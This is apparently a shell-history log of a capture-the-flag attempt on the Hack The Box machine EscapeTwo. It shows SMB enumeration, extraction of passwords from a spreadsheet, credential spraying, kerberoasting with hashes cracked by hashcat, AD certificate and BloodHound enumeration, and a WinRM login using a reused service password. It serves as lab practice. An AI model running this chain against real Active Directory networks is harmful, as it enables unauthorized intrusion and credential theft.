@@ -1,0 +1,399 @@
+[2026-01-09 23:50:56] [pane=%0] [CMD] cat ~/.ip
+[2026-01-09 23:51:44] [pane=%0] [CMD] echo "export IP=10.10.11.51" > ~/.ip
+[2026-01-09 23:51:50] [pane=%0] [CMD] cat ~/.ip
+[2026-01-09 23:52:07] [pane=%0] [CMD] ping -c 3 10.10.11.51
+[2026-01-10 00:14:31] [pane=%0] [CMD] nmap -p- --min-rate=3000 10.10.11.51 -Pn -oN EscapeTwo/logs/Escape2NmapOpenPorts.txt
+[2026-01-10 01:05:14] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' EscapeTwo/logs/Escape2NmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
+[2026-01-10 01:05:21] [pane=%0] [CMD] echo $ports
+[2026-01-10 01:06:29] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.10.11.35 -Pn -oN EscapeTwo/logs/nmap/NmapServicesVersions.txt
+[2026-01-10 18:37:59] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.10.11.51 -Pn -oN EscapeTwo/logs/nmap/EscapeTwoNmapServicesVersions.txt
+[2026-01-10 19:25:26] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-10 19:35:41] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-10 19:56:10] [pane=%0] [CMD] : #note EscapeTwo is an assumed breach machine. Creds given are rose / KxEPkKe6R8su
+[2026-01-10 19:59:22] [pane=%0] [CMD] smbclient -N -L //10.10.11.51
+[2026-01-10 20:01:01] [pane=%0] [CMD] smbclient //10.10.11.51 -U "rose"
+[2026-01-10 20:01:20] [pane=%0] [CMD] smbclient \\10.10.11.51 -U "rose"
+[2026-01-10 20:04:48] [pane=%0] [CMD] smbclient //10.10.11.51/ -U "rose"%"KxEPkKe6R8su"
+[2026-01-10 20:28:06] [pane=%0] [CMD] nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --shares
+[2026-01-10 20:42:45] [pane=%0] [CMD] nxc smb 10.10.11.51\Accounting Department READ -u rose -p "KxEPkKe6R8su" --share 
+[2026-01-10 20:42:51] [pane=%0] [CMD] nxc smb 10.10.11.51\Accounting Department -u rose -p "KxEPkKe6R8su" --share 
+[2026-01-10 20:43:30] [pane=%0] [CMD] nxc smb 10.10.11.51/Accounting Department -u rose -p "KxEPkKe6R8su" --share 
+[2026-01-10 20:45:13] [pane=%0] [CMD] nxc smb 10.10.11.51/Accounting Department -u rose -p "KxEPkKe6R8su" --share Accounting Department
+[2026-01-10 20:45:26] [pane=%0] [CMD] nxc smb 10.10.11.51/ -u rose -p "KxEPkKe6R8su" --share Accounting Department
+[2026-01-10 20:45:32] [pane=%0] [CMD] nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --share Accounting Department
+[2026-01-10 20:45:43] [pane=%0] [CMD] nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --share "Accounting Department"
+[2026-01-10 20:49:07] [pane=%0] [CMD] : #note don't think nxc smb module has ability to login into smb shares
+[2026-01-10 20:50:28] [pane=%0] [CMD] smbclient //10.10.11.51/Accounting Department -U "rose"%"KxEPkKe6R8su"
+[2026-01-10 20:50:42] [pane=%0] [CMD] smbclient //10.10.11.51/"Accounting Department" -U "rose"%"KxEPkKe6R8su"
+[2026-01-10 20:51:58] [pane=%0] [CMD] cd EscapeTwo/
+[2026-01-10 20:51:59] [pane=%0] [CMD] ll
+[2026-01-10 20:52:02] [pane=%0] [CMD] cd logs
+[2026-01-10 20:52:04] [pane=%0] [CMD] cd loot
+[2026-01-10 20:54:51] [pane=%0] [CMD] cd ..
+[2026-01-10 20:54:59] [pane=%0] [CMD] ll
+[2026-01-10 20:55:04] [pane=%0] [CMD] cd loot
+[2026-01-10 20:55:12] [pane=%0] [CMD] smbclient //10.10.11.51/"Accounting Department" -U "rose"%"KxEPkKe6R8su"
+[2026-01-10 20:55:32] [pane=%0] [CMD] ll
+[2026-01-10 21:04:29] [pane=%0] [CMD] python3 xmlx
+[2026-01-10 21:06:03] [pane=%0] [CMD] libreoffice
+[2026-01-10 21:06:23] [pane=%0] [CMD] xlsx2csv
+[2026-01-10 21:06:53] [pane=%0] [CMD] sudo apt remove
+[2026-01-10 21:07:05] [pane=%0] [CMD] sudo apt autoremove
+[2026-01-10 21:07:33] [pane=%0] [CMD] xlsx2csv accounting_2024.xlsx
+[2026-01-10 21:07:50] [pane=%0] [CMD] ll
+[2026-01-10 21:07:56] [pane=%0] [CMD] xlsx2csv accounts
+[2026-01-10 21:08:01] [pane=%0] [CMD] xlsx2csv accounts.xlsx
+[2026-01-10 21:09:25] [pane=%0] [CMD] file accounts.xlsx
+[2026-01-10 21:09:36] [pane=%0] [CMD] unzip accounts.xlsx
+[2026-01-10 21:09:39] [pane=%0] [CMD] ll
+[2026-01-10 21:10:18] [pane=%0] [CMD] cd xl
+[2026-01-10 21:10:19] [pane=%0] [CMD] ll
+[2026-01-10 21:10:31] [pane=%0] [CMD] cd worksheets
+[2026-01-10 21:10:33] [pane=%0] [CMD] ll
+[2026-01-10 21:10:59] [pane=%0] [CMD] xlsx2csv sheet1.xml
+[2026-01-10 21:18:22] [pane=%0] [CMD] : #note couldn't figure out how to open xlsx file on linux moving on to something else
+[2026-01-10 21:18:36] [pane=%0] [CMD] cd ../../../
+[2026-01-10 21:18:37] [pane=%0] [CMD] ls
+[2026-01-10 21:18:40] [pane=%0] [CMD] cd nmap
+[2026-01-10 21:18:42] [pane=%0] [CMD] ll
+[2026-01-10 21:18:57] [pane=%0] [CMD] cat EscapeTwoNmapServicesVersions.txt
+[2026-01-10 21:20:03] [pane=%1] [CMD] cd EscapeTwo
+[2026-01-10 21:22:33] [pane=%1] [CMD] sudo apt search libreoffic
+[2026-01-10 21:23:15] [pane=%1] [CMD] sudo apt search librecalc
+[2026-01-10 21:24:46] [pane=%1] [CMD] cd loot
+[2026-01-10 21:24:47] [pane=%1] [CMD] ls
+[2026-01-10 21:26:20] [pane=%1] [CMD] xlsx2csv accounting_2024.xlsx accounting_2024.csv
+[2026-01-10 21:26:29] [pane=%1] [CMD] cd ../nmap
+[2026-01-10 21:27:31] [pane=%1] [CMD] apt search libreoffice
+[2026-01-10 21:30:01] [pane=%1] [CMD] sudo apt update
+[2026-01-10 21:30:49] [pane=%1] [CMD] sudo apt install libreoffive
+[2026-01-10 21:30:51] [pane=%1] [CMD] sudo apt install libreoffice
+[2026-01-10 21:34:31] [pane=%1] [CMD] libreoffice calc
+[2026-01-10 21:35:55] [pane=%1] [CMD] cd ../loot
+[2026-01-10 21:35:56] [pane=%1] [CMD] ll
+[2026-01-10 21:36:06] [pane=%1] [CMD] strings accounts.xlsx
+[2026-01-10 22:02:58] [pane=%1] [CMD] unzip -L accounting_2024.xlsx
+[2026-01-10 22:03:36] [pane=%1] [CMD] file accounting_2024.xlsx
+[2026-01-10 22:04:08] [pane=%1] [CMD] ll
+[2026-01-10 22:04:32] [pane=%1] [CMD] mkdir accounts
+[2026-01-10 22:05:00] [pane=%1] [CMD] mv '[Content_Types].xml' accounts
+[2026-01-10 22:05:15] [pane=%1] [CMD] mv docProps accounts
+[2026-01-10 22:05:21] [pane=%1] [CMD] mv _rels account
+[2026-01-10 22:05:27] [pane=%1] [CMD] ll
+[2026-01-10 22:05:50] [pane=%1] [CMD] cd ..
+[2026-01-10 22:05:54] [pane=%1] [CMD] cd loot
+[2026-01-10 22:05:58] [pane=%1] [CMD] cd account
+[2026-01-10 22:05:59] [pane=%1] [CMD] ls
+[2026-01-10 22:06:01] [pane=%1] [CMD] ll
+[2026-01-10 22:06:06] [pane=%1] [CMD] cd ..
+[2026-01-10 22:06:15] [pane=%1] [CMD] rmdir account
+[2026-01-10 22:06:19] [pane=%1] [CMD] ll
+[2026-01-10 22:06:26] [pane=%1] [CMD] ll account
+[2026-01-10 22:06:32] [pane=%1] [CMD] ls -aslp account
+[2026-01-10 22:07:17] [pane=%1] [CMD] batcat account/.rels
+[2026-01-10 22:07:55] [pane=%1] [CMD] rmdir account
+[2026-01-10 22:08:02] [pane=%1] [CMD] rmdir -rf account
+[2026-01-10 22:08:08] [pane=%1] [CMD] rmdir --rf account
+[2026-01-10 22:08:28] [pane=%1] [CMD] rm --rf account
+[2026-01-10 22:08:37] [pane=%1] [CMD] rm -rf account
+[2026-01-10 22:08:39] [pane=%1] [CMD] ll
+[2026-01-10 22:09:04] [pane=%1] [CMD] mv xl accounts
+[2026-01-10 22:09:06] [pane=%1] [CMD] ll
+[2026-01-10 22:09:33] [pane=%1] [CMD] unzip accounting_2024.xlsx > accounting
+[2026-01-10 22:10:27] [pane=%1] [CMD] cp accounting_2024.xlsx accounting_2024.xlsx.bak
+[2026-01-10 22:10:30] [pane=%1] [CMD] ll
+[2026-01-10 22:10:44] [pane=%1] [CMD] ll
+[2026-01-10 22:11:30] [pane=%1] [CMD] batcat accounting
+[2026-01-10 22:11:36] [pane=%1] [CMD] batcat accounting_2024.xlsx
+[2026-01-10 22:11:52] [pane=%1] [CMD] cd xl
+[2026-01-10 22:11:53] [pane=%1] [CMD] ls
+[2026-01-10 22:12:06] [pane=%1] [CMD] cd worksheets
+[2026-01-10 22:12:19] [pane=%1] [CMD] ll
+[2026-01-10 22:12:24] [pane=%1] [CMD] batcat sheet1.xml
+[2026-01-10 22:13:22] [pane=%1] [CMD] ll
+[2026-01-10 22:13:26] [pane=%1] [CMD] cd ..
+[2026-01-10 22:13:27] [pane=%1] [CMD] ls
+[2026-01-10 22:14:35] [pane=%1] [CMD] xmllint sharedStrings.xml
+[2026-01-10 22:14:55] [pane=%1] [CMD] batcat sharedStrings.xml
+[2026-01-10 22:15:27] [pane=%1] [CMD] cd ..
+[2026-01-10 22:15:29] [pane=%1] [CMD] ll
+[2026-01-10 22:15:35] [pane=%1] [CMD] cd accounts
+[2026-01-10 22:15:38] [pane=%1] [CMD] ll
+[2026-01-10 22:15:41] [pane=%1] [CMD] cd xl
+[2026-01-10 22:15:43] [pane=%1] [CMD] ll
+[2026-01-10 22:16:04] [pane=%1] [CMD] batcat sharedStrings.xml
+[2026-01-10 22:20:30] [pane=%1] [CMD] cat sharedStrings.xml
+[2026-01-10 22:22:32] [pane=%1] [CMD] strings sharedStrings.xml
+[2026-01-10 22:22:50] [pane=%1] [CMD] cd ..
+[2026-01-10 22:22:51] [pane=%1] [CMD] ll
+[2026-01-10 22:22:54] [pane=%1] [CMD] cd ..
+[2026-01-10 22:23:11] [pane=%1] [CMD] strings accounting_2024.xlsx
+[2026-01-10 22:29:35] [pane=%1] [CMD] find . -type f -print0 | xargs -0 strings
+[2026-01-10 22:42:59] [pane=%1] [CMD] find . -type f -print0 | xargs -0 strings | xxd 
+[2026-01-10 22:43:13] [pane=%1] [CMD] find . -type f -print0 | xxd 
+[2026-01-10 22:43:44] [pane=%1] [CMD] find . -type f -print | xxd 
+[2026-01-10 22:45:56] [pane=%1] [CMD] xargs
+[2026-01-10 22:46:48] [pane=%1] [CMD] xargs xxd
+[2026-01-10 22:48:46] [pane=%1] [CMD] xargs cat xxd
+[2026-01-10 22:49:09] [pane=%1] [CMD] xargs echo xxd
+[2026-01-10 22:49:39] [pane=%1] [CMD] xargs
+[2026-01-10 23:34:39] [pane=%1] [CMD] ll
+[2026-01-10 23:42:05] [pane=%1] [CMD] : #note after a deep dive on xlsx files on linux -- turns out the xlsx files are corrupted. trying to open them in office libre calculator or using xlsx2csv will return garbage. as a matter of best practice you should always look at all files in a zip of any kind including xslx files which just are zipped up xml files. sharedstrings.xml contain cell contents. it's named like that because excel uses it as an index table to store unique text strings. I ended up using batcat which is debian bat to look at xml files with a bit of color and formatting. You can also use xmllint.
+[2026-01-12 18:30:30] [pane=%1] [CMD] cd accounting
+[2026-01-12 18:30:31] [pane=%1] [CMD] ls
+[2026-01-12 18:30:45] [pane=%1] [CMD] cd xl
+[2026-01-12 18:30:47] [pane=%1] [CMD] dir
+[2026-01-12 18:30:51] [pane=%1] [CMD] batcat sharedStrings.xml
+[2026-01-12 18:31:02] [pane=%1] [CMD] cd ../..
+[2026-01-12 18:31:07] [pane=%1] [CMD] cd accounts
+[2026-01-12 18:31:10] [pane=%1] [CMD] cd lx
+[2026-01-12 18:31:11] [pane=%1] [CMD] ls
+[2026-01-12 18:31:14] [pane=%1] [CMD] cd xl
+[2026-01-12 18:31:15] [pane=%1] [CMD] ls
+[2026-01-12 18:31:23] [pane=%1] [CMD] batcat sharedStrings.xml
+[2026-01-12 18:32:03] [pane=%1] [CMD] xmllint sharedStrings.xml
+[2026-01-12 18:33:11] [pane=%1] [CMD] vim sharedStrings.xml
+[2026-01-12 18:36:51] [pane=%1] [CMD] : #note found usernames and passwords in the accounts xlsx file we downloaded. after unzipping and digging throught files, the file at ~/Documents/obsidian/docs/CTF/HTB/EscapeTwo/loot/accounts/xl/sharedStrings.xml contained the usernames and passwords after using xmllint or batcat on it.
+[2026-01-12 18:39:20] [pane=%1] [CMD] xmllint sharedStrings.xml
+[2026-01-12 18:39:35] [pane=%1] [CMD] xmllint sharedStrings.xml | grep local
+[2026-01-12 18:39:56] [pane=%1] [CMD] xmllint sharedStrings.xml | grep preserve
+[2026-01-12 18:43:50] [pane=%0] [CMD] cd ..
+[2026-01-12 18:43:52] [pane=%0] [CMD] ll
+[2026-01-12 18:43:55] [pane=%0] [CMD] cd loot
+[2026-01-12 18:43:56] [pane=%0] [CMD] ls
+[2026-01-12 18:44:00] [pane=%0] [CMD] cat users.txt
+[2026-01-12 18:44:20] [pane=%0] [CMD] vim users.txt
+[2026-01-12 19:21:09] [pane=%1] [CMD] awk -F"," '{print}' sharedStrings.xml
+[2026-01-12 21:34:39] [pane=%1] [CMD] batcat sharedStrings.xml
+[2026-01-12 21:47:28] [pane=%1] [CMD] batcat sharedStrings.xml | sed
+[2026-01-12 21:55:48] [pane=%1] [CMD] sed 's/.*preserve">/preserve">/; s/</\n</g' /home/b7h30/Documents/obsidian/docs/CTF/HTB/EscapeTwo/loot/accounts/xl/sharedStrings.xml \ | sed -n 's/.*preserve">//p' \ | sed '1,5d' \ | awk 'NR%5{printf "%s ",$0; next} {print $0}' \
+
+[2026-01-12 21:59:13] [pane=%1] [CMD] sed 's/.*preserve">/preserve">/; s/</\n</g' /home/b7h30/Documents/obsidian/docs/CTF/HTB/EscapeTwo/loot/accounts/xl/sharedStrings.xml \ | sed -n 's/.*preserve">//p' \ | sed '1,5d' \ | awk 'NR%5{printf "%s ",$0; next} {print $0}'
+[2026-01-12 21:59:40] [pane=%1] [CMD] sed 's/.*preserve">/preserve">/; s/</\n</g' ~/Documents/obsidian/docs/CTF/HTB/EscapeTwo/loot/accounts/xl/sharedStrings.xml \ | sed -n 's/.*preserve">//p' \ | sed '1,5d' \ | awk 'NR%5{printf "%s ",$0; next} {print $0}'
+[2026-01-12 22:12:39] [pane=%1] [CMD] : #note disregard the previous sed comands, I am attempting to extract the user info from the sharedStrings.xml file.
+[2026-01-12 23:37:01] [pane=%1] [CMD] vim sharedStrings.xml
+[2026-01-12 23:37:30] [pane=%1] [CMD] cp sharedStrings.xml users.txt
+[2026-01-12 23:37:31] [pane=%1] [CMD] ll
+[2026-01-12 23:37:34] [pane=%1] [CMD] cat users.txt
+[2026-01-12 23:37:38] [pane=%1] [CMD] vim users.txt
+[2026-01-13 17:32:33] [pane=%1] [CMD] cat users.txt
+[2026-01-13 17:32:49] [pane=%1] [CMD] vim users.txt
+[2026-01-13 23:28:47] [pane=%2] [CMD] nxc smb 10.10.11.51 -u angela -p '0fwz7Q4mSpurIt99'
+[2026-01-13 23:33:08] [pane=%2] [CMD] nxc smb 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-13 23:33:42] [pane=%2] [CMD] nxc smb 10.10.11.51 -u kevin -p 'Md9Wlq1E5bZnVDVo'
+[2026-01-13 23:34:31] [pane=%2] [CMD] nxc smb 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!'
+[2026-01-13 23:45:52] [pane=%2] [CMD] nxc smb 10.10.11.51 -u angela -p '0fwz7Q4mSpurIt99'
+[2026-01-13 23:46:04] [pane=%2] [CMD] nxc smb 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-13 23:46:49] [pane=%2] [CMD] nxc smb 10.10.11.51 -u kevin -p 'Md9Wlq1E5bZnVDVo'
+[2026-01-13 23:47:01] [pane=%2] [CMD] nxc smb 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!'
+[2026-01-13 23:48:06] [pane=%2] [CMD] nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!'
+[2026-01-13 23:49:58] [pane=%2] [CMD] : #note oscar appears to be the only user with smb share
+[2026-01-13 23:51:10] [pane=%2] [CMD] nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
+[2026-01-13 23:55:48] [pane=%2] [CMD] exiftool WindowsXP_1551719014755.jpg
+[2026-01-14 00:00:43] [pane=%2] [CMD] : #note oscar appears to have smb share access and using nxc mssql we appear to have domain admin on mssql server
+[2026-01-14 00:03:41] [pane=%2] [CMD] impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51
+[2026-01-14 00:25:07] [pane=%2] [CMD] impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51
+[2026-01-14 00:47:10] [pane=%2] [CMD] evil-winrm -i 10.10.11.51 -u sa -H 'MSSQLP@ssw0rd!'
+[2026-01-14 00:47:18] [pane=%2] [CMD] evil-winrm -i 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!'
+[2026-01-14 00:54:45] [pane=%2] [CMD] impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51
+[2026-01-14 00:58:07] [pane=%3] [CMD] evil-winrm -i 10.10.11.42 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-14 01:05:57] [pane=%3] [CMD] nxc winrm -i 10.10.11.42 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-14 01:06:31] [pane=%3] [CMD] nxc winrm target 10.10.11.42 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-14 01:07:45] [pane=%3] [CMD] nxc winrm 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'
+[2026-01-14 01:13:28] [pane=%3] [CMD] smbclient //10.10.11.51/ -U "oscar"%"86LxLBMgEWaKUnBG"
+[2026-01-14 01:13:41] [pane=%3] [CMD] smbclient //10.10.11.51/ -U "oscar"%"86LxLBMgEWaKUnBG" --shares
+[2026-01-14 01:13:49] [pane=%3] [CMD] smbclient //10.10.11.51/ -U "oscar"%"86LxLBMgEWaKUnBG" --share
+[2026-01-14 01:13:52] [pane=%3] [CMD] smbclient //10.10.11.51/ -U "oscar"%"86LxLBMgEWaKUnBG" -share
+[2026-01-14 01:14:30] [pane=%3] [CMD] nxc xmb 10.10.11.51 -u oscar -p "86LxLBMgEWaKUnBG" --shares
+[2026-01-14 01:14:36] [pane=%3] [CMD] nxc smb 10.10.11.51 -u oscar -p "86LxLBMgEWaKUnBG" --shares
+[2026-01-14 01:15:54] [pane=%3] [CMD] smbclient //10.10.11.51/"Accounting Department" -U "oscar"%"86LxLBMgEWaKUnBG"
+[2026-01-14 01:16:58] [pane=%3] [CMD] : #note oscar cannot login using evil-winrm and smb access reveals the Accounting department share which we already have
+[2026-01-14 01:20:22] [pane=%3] [CMD] impacket-GetNPUsers sequel.htb/'oscar':'86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -request
+[2026-01-14 01:23:00] [pane=%3] [CMD] certipy find -u oscar@sequel.htb -p '86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -vulnerable -stdout
+[2026-01-14 01:25:39] [pane=%3] [CMD] impacket-GetUserSPNs sequel.htb/oscar:'86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -request
+[2026-01-14 01:28:22] [pane=%3] [CMD] sudo ntupdate 10.10.11.51
+[2026-01-14 01:30:44] [pane=%3] [CMD] sudo ntpdate 10.10.11.51
+[2026-01-14 01:31:23] [pane=%3] [CMD] sudo rdate -n sequel.htb
+[2026-01-13 18:30:47] [pane=%3] [CMD] ntpdate
+[2026-01-13 18:32:10] [pane=%3] [CMD] sudo ntpdate 10.10.11.51
+[2026-01-13 18:32:23] [pane=%3] [CMD] impacket-GetUserSPNs sequel.htb/oscar:'86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -request
+[2026-01-13 18:42:27] [pane=%3] [CMD] : #note kerberoasting oscar dumps Kerberos TGS hashes. next step is to crack them to get plaintext passwords
+[2026-01-13 18:43:48] [pane=%3] [CMD] echo '$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$9f80fecfd8b522b951a8fd4528317e31$6ff385a72fef
+44d0812fb309db8bfee41e0ca06e8737734e07be1f2d64b66b2878ad3d206ebbc80b3dc48137bb933f6941b6f54bd3711
+060a2dc266060ffc5a84c9ede0a441d21edaa8036cfc74a50f93fdad0ec5a08510bcc9f090a52719529f121f1c7c311cf
+06edc464b77bcf8b4de9dcb4e491493c44b3824820c6b9dcf27053cc2c5e5efaa12b3fc65d08e57d8312f24f02bc46a5a
+53d5e9b6021e3df1b6e241981dbe7a49a7c97614221fe7483fae9d491f3be8fb73903e83b7a81b5895adf8a745bb15fe5
+6d6ce504eba2aaa22d41620f36e10270459e92748f6a0ef0bb0cc5a0de32ccdcd87325e97f741d6aca446541d95bb8a6b
+d16c227fd6d5c59bb2c61bd149bc98ea411bd5aa897c71c011e2c5a68d8ed387936640a79ec5d46415f3f2e7f27b3a5b8
+9fe6d70a1a0aa9cc8ddcf91d2d2a7dcd8d8c786c2e44f7d2babff8e9deaa52dd48eb3031c75e5719349b33f3249c4fafb
+b96c38df6da9a0662a2cd90bbe37abc78c076f5dd644c0d61abba8e85136629be229772f20a6972afc947cf5cb93ee7f2
+c1a1ab119c5389eec3274142bb03417ef45c3666a3be16cc2f53dd81ea27d376ed051d5f35ce996c9ce16e9fa4a7d3807
+4827d974c6e8e0f90f15e9e314c1ed4d3e203441d9071354590bbcbfe19617d4c71ccfcd16ccb329e3ee9705c40f264e3
+9b0d3dfed1a7a85caf2ac00197f4560505f4814dd6e4e35e4da6bfbd9f50293ed987c42a46c2de1788f5cbc583964c6f7
+56e7e8f503a4225fd2aeb6081681d1331405b2d70151d52f68606ab2424cb946b32d86e9b6c5d4edd44a8a3b22ea46fca
+8927268abeb815640e2edd3859944c60d23420873e7311392949eab4d82a6d1898fa9a2bcb72fa4ec6bcf2d24b53d655e018b23930cf7344b3c290f52ee3e20ea9dcd7c8644fcc57ffda353c87af431d6a45820da2e875f463d4755efdac838ea1306541f01afe68648ea173fc4b13f357bf9ec423b7677c8edff9618193b219f309e5f6cbeafe23744f76638b25fe814e2513825475a2d4e4de034d77a138b7e5d9714a690d42ae826f3f03fd489ced7f26a5a55e5ce274868101852909a3d1550452d64649cf20192b0d31e43d183f86ed62a93d3b63c639ec01dd95c4c04a4cd493c69f37bab7af4e2c72c49192619852a2dd215ea6f81fee0a128222d33b0d3cc21c5b88aff59f065de1485f73c6e893f17728d0ab4153488ba7591460db4392988579eb412113c6ed60d3ea50496cf60e8bed77c8a09f142fee9da440ac710c9a9bbe8acb4c1feb1a97c1dff5c9b88740057f25af019e6dfd775ed3d8f011e38192cac821fab0fa40d49115286c0db2fabef1471b9c69d3be1ddecef41ddac08dd750a154e26b8b6aa44f4e0f5cc7e797c43680d7dad781ef71bcb87ca2cd68c05864ff7979e91c22d1e6580409733c859044e0ffa1dc284f45074c56cc2bfedeeb' > EscapeTwo/loot/kerberoast.txt
+[2026-01-13 18:44:54] [pane=%3] [CMD] echo '$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$7cd00eb6b156fcd08ec3d4373d39743d$5793e28514ab3b
+681b9697b615c9490ec1afc24c8cc2ae06cf0f54c18458caf0a84b63668e3a5919f97c7a50260d2d7017297ef4b2e808d
+e026e07389285609aa8a31dd093294fb7ba5e2103f31b15321ce03082a3dd11b4f2c7bcb485d0766ee3ea88e68e6dfa65
+d19e213629485d4fde1f886ac2ff7766b3b94a712f98b3e95d0c247421d50c78221164a0dac0077f64d96b16b27e3e354
+eb4b5552abf437d4e3f6ac91eba791298b3857f5b4594df984617b0eb0fdafdbf61c46e15bae797f1fe149e03d833bdc0
+a717dfd0521deb8128245ca584ceb51a821b40d7ff09f36cc2f93c7e912a2e3e856b6c44c03658af8880787775f5fc43e
+2f4fd0f0f65a77e3a86c57cb067bedd2571d0e7d268e3d25004fb8361d711684b2bd011279eb8c21f5bcf17356e7b83a5
+a2bc30e571fe2b3a046d10ea7f5ae1942d7fe47b8e818e64b37361354241862f1973e82168d7ac9fa4cc0b1df3dbfd250
+4caa254f7ed3e622d462a17e7be436ca7bd81e1bfef14fd5ff79ecb36e6f1d1cf0f382facdf5db1d313bbc8723a2c6555
+62539847184866a84a33b7bcd9a4793cf7e9ae42e40a4c2579646bcf46ed2b82099da8c25ff270f61a6865e57e4ebcc4c
+1f6961415152327e786ed3d3870a8ad256eabc15b53e9f127cb76ffc620dbba9802522809d6f87c7ad1604246133d68de
+0be55685a8f2db8ed793d0e8d3680c33526bff306cd91ec5c50604ec367284b20b22c03209aacf34a61617c954a56ae38
+074a397316d1cd4da94b341fd820528dd1ea5a344c289382f974af8774a7256642ff97c1aaeb05fa8d693781290ab2a20
+7dee6bb66fecb29f48fbcaa6aa60a7e656ff9321d2fb21dfe678692fd3b9dd7f20b27159426cbfc40fb08430e49b16f3a
+c79f6a7d1b5c0c2be3cf36da5e705a5e965d330f4676d911b945a5301cda816b935af09a4e3acb10d91cbb5dcfd91a9df
+79d5830c8332907c3e9004b9d15992a4608c01703b322fe9a9800cece842ca87f005ae34e2833c3198d812f8e9df1f213
+eb68b54a6b7e731eed9a616530b61d42d5f09e4b3921ffb2b19b9faf772af214dc43613fc1db4661ff028632f5f208c06
+d169bf59b31473f0a8fb4e9b54d5d003ba4e7ada33c0ae388a89d1654e250a077ce1129ade761dcd01fcf27c76880bbe1
+f8395e6dded5e845079c2dc54e5b3f096b3583cf886c25b210e5d4164a1acaafdb8ee665fd2a21e8877bed6ed86fae3df
+3ec7e55e15199b07960bd09abd73ae96cf20a98db4d3ea3a8c9aa84fe3ea2f063602b6f45e9984ca28e3cd6a88266a31c
+70f47936c4602de3f0386e29c65252b308827e8e99e01db52f0a2c6d67f1c30e1eefb67fee26d228ed95db973b76ded0c
+31eea18f9a6da378c1bf0d0df87d340e42b138020fd94b46c1c1e57dbcaa34324a4768d70cc2973d95def5baeadf73a33
+6f500b4b1450c78f703fbc03d7758' >> EscapeTwo/loot/kerberoast.txt
+[2026-01-13 18:45:15] [pane=%3] [CMD] vim EscapeTwo/loot/kerberoast.txt
+[2026-01-13 18:46:45] [pane=%3] [CMD] hashcat -m 13100 EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt
+[2026-01-13 18:47:27] [pane=%3] [CMD] hashcat EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt
+[2026-01-13 18:48:10] [pane=%3] [CMD] vim EscapeTwo/loot/kerberoast.txt
+[2026-01-13 18:51:57] [pane=%3] [CMD] hashcat EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt
+[2026-01-14 12:21:15] [pane=%3] [CMD] hashcat -m 13100 EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+[2026-01-14 12:22:30] [pane=%3] [CMD] vim EscapeTwo/loot/kerberoast.txt
+[2026-01-14 12:23:25] [pane=%3] [CMD] hashcat -m 13100 EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+[2026-01-14 12:45:30] [pane=%3] [CMD] certipy find -u oscar@sequel.htb -p '86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -vulnerable -stdout
+[2026-01-14 12:50:30] [pane=%3] [CMD] vim EscapeTwo/loot/users.txt
+[2026-01-14 12:51:42] [pane=%3] [CMD] certipy find -u sa@sequel.htb -p 'MSSQLP@ssw0rd!' -dc-ip 10.10.11.51 -vulnerable -stdout
+[2026-01-14 12:54:07] [pane=%3] [CMD] notes CA exist and authenticated user can enroll but no vulnerable templates found. web enrollment is disabled, user specified SAN disabled
+[2026-01-14 12:54:12] [pane=%3] [CMD] : #note CA exist and authenticated user can enroll but no vulnerable templates found. web enrollment is disabled, user specified SAN disabled
+[2026-01-14 12:55:33] [pane=%3] [CMD] bloodhound-python -u oscar -p '86LxLBMgEWaKUnBG' -d sequel.htb -ns 10.10.11.51 -c All --zip -o EscapeTwo/loot/
+[2026-01-14 17:26:20] [pane=%3] [CMD] : #note using the sa account impacket mssqlclient. we are able to send shell commands to the servers command line. digging through directory we find C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI that has svc_sql password of WqSZAF6CysDQbGb3.
+[2026-01-14 17:27:03] [pane=%3] [CMD] nxc winrm 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+[2026-01-14 17:28:03] [pane=%3] [CMD] : #note nxc winrm returned Pwn3d! which means we can geta shell. 
+[2026-01-14 17:28:12] [pane=%3] [CMD] nxc winrm 10.10.11.51 -u oscar -p 'WqSZAF6CysDQbGb3'
+[2026-01-14 17:28:28] [pane=%3] [CMD] nxc smb 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+[2026-01-14 17:29:46] [pane=%3] [CMD] evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+[2026-01-14 17:31:15] [pane=%1] [CMD] : #note svc_sql password used to login ryan in remotely succeded
